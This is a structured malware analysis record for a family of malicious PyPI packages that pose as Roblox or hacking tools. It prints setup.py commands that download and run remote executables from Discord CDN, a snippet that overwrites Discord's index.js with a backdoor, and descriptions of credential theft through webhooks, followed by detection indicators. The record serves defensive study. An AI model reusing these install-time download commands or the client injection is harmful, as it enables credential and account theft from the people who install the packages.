package_info.package_name: cyphers (representative of the set: cyphers, rbxtool, rbxotools, rblxtools, pippytests, pippytest, testpipperz, testpipper, plutos, stealthpy, hackerfilelol, hackerfileloll)
package_info.package_versions: All versions released August 1, 2022 (or July 31, 2022 for stealthpy, hackerfilelol, hackerfileloll)
package_info.why_malicious: These packages impersonate legitimate Roblox tools, thread management, or hacking modules but provide no authentic functionality. Instead, they install password-stealing malware that exfiltrates sensitive data from browsers, Discord, and Roblox, and injects persistent backdoors into the Discord client to maintain ongoing access and data theft.

malicious_snippets.code_snippet:
os.system('curl -o ZYXMN.exe https://cdn.discordapp.com/attachments/.../ZYXMN.exe && ZYXMN.exe')
os.system('curl -o ZYRBX.exe https://cdn.discordapp.com/attachments/.../ZYRBX.exe && ZYRBX.exe')
malicious_snippets.code_behavior: During installation-time, the code executes shell commands to download two remote executables (ZYXMN.exe and ZYRBX.exe) from the Discord CDN and immediately runs them, resulting in the deployment of info-stealing malware onto the victim's system.

malice_analysis.why_suspicious: setup.py is intended solely for package installation logic and should never download or execute remote binaries, especially from non-official sources.
malice_analysis.violated_expectations: Standard setup.py scripts do not fetch or execute external executables; such behavior is a clear deviation from normal package installation practices.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies, but this is rare, always explicit, and never involves executing untrusted binaries from third-party sources.
key_indicators: Use of os.system to invoke shell commands within setup.py
Remote binary download from Discord CDN URLs
Immediate execution of downloaded files without user consent
No user notification or opt-in for binary execution

malicious_snippets.code_snippet: Steals browser data by decrypting local database master keys and exfiltrates passwords, cookies, credit cards, and history via Discord webhook.
malicious_snippets.code_behavior: At post-installation runtime, the binary accesses browser credential stores, decrypts master keys, collects sensitive data such as passwords, cookies, credit card information, and browsing history, and transmits this data to a Discord webhook controlled by the attacker, resulting in large-scale credential and data theft.

malice_analysis.why_suspicious: Accessing and exfiltrating browser-stored credentials and sensitive data is a hallmark of info-stealing malware and is never performed by legitimate packages.
malice_analysis.violated_expectations: No legitimate package or binary should access or transmit browser secrets or user credentials without explicit user consent and secure handling.
malice_analysis.similar_legitimate_use: Enterprise password managers may access browser credentials, but only with explicit user consent, secure storage, and never exfiltrate data to third-party webhooks.
key_indicators: Decryption of browser master keys to access stored credentials
Automated collection of passwords, cookies, credit cards, and history
Exfiltration of harvested data to Discord webhook endpoints
Execution of these actions by a dropped binary not part of the original package

malicious_snippets.code_snippet: Steals Roblox account cookie, user ID, Robux balance, and Premium status, then exfiltrates to Discord webhook.
malicious_snippets.code_behavior: At post-installation runtime, the binary locates and extracts Roblox account credentials, including session cookies, user ID, Robux balance, and Premium status, and sends this information to a Discord webhook, enabling account takeover and financial theft.

malice_analysis.why_suspicious: Harvesting and exfiltrating Roblox credentials and account data is a clear sign of targeted credential theft and is never justified in legitimate software.
malice_analysis.violated_expectations: No legitimate tool should access or transmit Roblox account secrets or financial data without user authorization and secure APIs.
malice_analysis.similar_legitimate_use: Roblox account management tools may access account data, but only with explicit user consent and through secure, official APIs, never via direct file or cookie access or exfiltration to webhooks.
key_indicators: Access to Roblox credential storage and session cookies
Extraction of user ID, Robux balance, and Premium status
Transmission of sensitive data to Discord webhook endpoints
Execution by a dropped binary not part of the original package

execution_context.trigger: runtime (when Discord client is present and restarted)
execution_context.file_location: index.js under discord_desktop_core folder (Discord client modification)

malicious_snippets.code_snippet:
with open((self.get_core(dir)[0] + '\\index.js'), 'w', encoding='utf-8') as f:
    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]))
malicious_snippets.code_behavior: At runtime, the code overwrites the Discord client's index.js file within the discord_desktop_core folder with a malicious JavaScript payload, injecting a persistent backdoor that steals Discord authentication tokens, billing information, and credit card details, and ensures continued access for the attacker.

malice_analysis.why_suspicious: Modifying application files to inject persistent backdoors is a classic malware technique, especially when targeting widely used applications like Discord.
malice_analysis.violated_expectations: No legitimate package should alter third-party application code, particularly to inject credential-stealing scripts or establish persistence.
malice_analysis.similar_legitimate_use: Custom Discord client mods may alter client files, but only with user opt-in, open source code, and never for credential exfiltration or persistence.
key_indicators: Injection of credential-stealing and persistence code

attack_chain.action: User installs the malicious PyPI package, triggering setup.py.
attack_chain.leads_to: Malware binaries are downloaded and executed on the victim's system.

attack_chain.action: Malware binaries (ZYXMN.exe, ZYRBX.exe) execute, harvesting browser, Discord, and Roblox credentials.
attack_chain.leads_to: Sensitive data is collected from the victim's system, including browser credentials and Roblox account information.

attack_chain.action: Malware modifies Discord client files to inject persistent JavaScript backdoor.
attack_chain.leads_to: Discord client becomes a persistent info-stealing backdoor, enabling ongoing credential theft.

attack_chain.action: Harvested data is exfiltrated to attacker-controlled Discord webhooks.
attack_chain.leads_to: Attacker receives stolen credentials and sensitive information via Discord webhooks.

behavioral_signatures: setup.py scripts that download and execute remote binaries using os.system or subprocess
Unauthorized modification of Discord client files, specifically index.js in the discord_desktop_core directory
Network connections to Discord CDN (cdn.discordapp.com/attachments/...) and Discord webhooks (discord.com/api/webhooks/...) during or after package installation
Access to browser credential stores and decryption of master keys by unknown or dropped executables
file_indicators: Presence of ZYXMN.exe, ZYRBX.exe, or Main.exe in user directories after package installation
Modified index.js file under Discord's discord_desktop_core folder
setup.py containing os.system or subprocess calls to download and execute binaries
network_indicators: Outbound connections to Discord CDN (cdn.discordapp.com/attachments/...) for binary downloads
Outbound HTTP POST requests to Discord webhooks (discord.com/api/webhooks/...) from non-Discord processes
detection_knowledge.how_to_detect: Monitor for setup.py scripts that invoke network downloads or execute binaries during installation. Detect unauthorized changes to Discord client files, especially index.js in the discord_desktop_core directory. Flag outbound connections to Discord CDN and Discord webhooks from processes other than the official Discord client. Alert on access to browser credential stores and decryption of master keys by unknown executables such as ZYXMN.exe or ZYRBX.exe.
